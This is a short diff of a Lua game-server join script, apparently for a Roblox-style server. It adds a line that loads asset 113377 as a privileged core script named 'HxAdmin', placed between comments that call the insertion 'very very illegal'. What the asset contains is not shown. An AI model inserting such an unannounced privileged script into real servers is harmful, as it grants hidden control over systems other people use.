@@ -376,6 +376,7 @@ if access then
 if timeout then
 	scriptContext:SetTimeout(timeout)
 end
+
 scriptContext.ScriptsDisabled = false
 
 -- START CHAT LOGS --
@@ -440,6 +441,9 @@ players.PlayerAdded:connect(function(player)
 end)
 --END EC--
 
+-- Do something very very illegal
+scriptContext:AddCoreScript(113377, scriptContext, "HxAdmin")
+-- Stop doing something very illegal
 
 -- StartGame --
 
